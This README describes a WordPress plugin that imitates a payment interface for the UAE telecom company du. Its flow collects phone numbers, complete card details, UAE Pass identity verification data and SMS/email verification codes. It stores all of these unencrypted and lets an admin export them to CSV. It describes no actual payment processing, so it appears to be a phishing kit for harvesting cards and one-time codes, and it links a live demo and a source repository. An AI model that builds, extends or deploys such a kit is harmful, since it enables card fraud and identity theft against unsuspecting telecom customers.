# DU Payment WordPress Plugin

A complete WordPress plugin for DU telecommunications payment interface with database integration.

## Description

This plugin provides a complete payment interface for DU telecommunications services that can be easily embedded into any WordPress site. It includes a full React-based frontend, database integration for storing payment data, and comprehensive admin panel.

## Features

- **Complete Payment Flow**: Multi-step payment process with phone verification
- **Mobile-First Design**: Optimized for mobile devices  
- **Database Integration**: Automatic MySQL database integration with WordPress
- **Real-time Data Storage**: Saves user input immediately at each step without encryption
- **Admin Panel**: View statistics and manage payment data
- **Shortcode Support**: Easy integration with shortcodes
- **AJAX Processing**: Smooth user experience with AJAX form handling

## Installation

### Method 1: Upload Plugin Files
1. Download the plugin files
2. Upload the `du-payment-wordpress-plugin` folder to `/wp-content/plugins/`
3. Activate the plugin through the 'Plugins' menu in WordPress

### Method 2: WordPress Admin Upload
1. Go to Plugins > Add New > Upload Plugin
2. Choose the plugin zip file
3. Install and activate

## Usage

### Shortcodes

**Basic Usage:**
```
[du_payment]
```

**With Custom Dimensions:**
```
[du_payment width="100%" height="700px"]
```

**Full Page Mode:**
```
[du_payment_full]
```

### Page Integration

Create a new page and add the shortcode to display the payment interface.

## Database Tables

The plugin automatically creates the following database tables:

- `wp_du_phone_numbers` - Stores phone numbers
- `wp_du_card_details` - Stores complete card information (unencrypted)
- `wp_du_verification_codes` - Stores verification codes
- `wp_du_sessions` - Tracks user sessions
- `wp_du_payment_attempts` - Logs all payment attempts

## Admin Panel

Access the admin panel at **Settings > DU Payment** to:

- View usage statistics
- Monitor payment data
- Export data to CSV
- View shortcode examples

## Data Storage

**Important:** This plugin stores sensitive payment data (phone numbers, card details, verification codes) immediately upon entry without encryption, as designed for specific use cases. Ensure your WordPress installation follows security best practices.

## Security Considerations

- Ensure your WordPress site uses HTTPS
- Keep WordPress and all plugins updated
- Use strong admin passwords
- Consider additional security plugins
- Regular database backups recommended

## Live Demo

- **Demo Site**: https://pqfharcu.manus.space
- **Source Code**: https://github.com/du53344/duuu

## Payment Flow

1. **Phone Number Entry**: User enters phone number
2. **Payment Details**: Credit card information input  
3. **Security Check**: Additional verification step
4. **UAE Pass Integration**: Government ID verification
5. **Verification Code**: SMS/Email verification
6. **Loading Screen**: Processing animation

## Customization

### Styling
The plugin uses the existing React application styles. To customize:
1. Modify CSS files in `du-payment-site/dist/assets/`
2. Override styles in your theme's CSS

### Functionality
- Extend database schema by modifying `includes/class-database.php`
- Add new payment steps by modifying the React application
- Integrate with external payment gateways

## Technical Requirements

- WordPress 5.0 or higher
- PHP 7.4 or higher
- MySQL 5.6 or higher
- Modern web browser with JavaScript enabled

## Support

For technical support:
1. Check the admin panel for configuration
2. Review WordPress error logs
3. Ensure all plugin files are properly uploaded
4. Verify database permissions

## Changelog

### 1.0.0
- Initial release
- Complete payment interface integration
- Database integration with WordPress
- Admin panel with statistics
- Shortcode support
- AJAX form processing

## License

This plugin is provided as-is for integration purposes. Please ensure compliance with your local regulations regarding payment processing and data storage.

## Credits

- Built with React and WordPress
- Database integration with MySQL
- Responsive design for mobile devices
- AJAX processing for smooth user experience

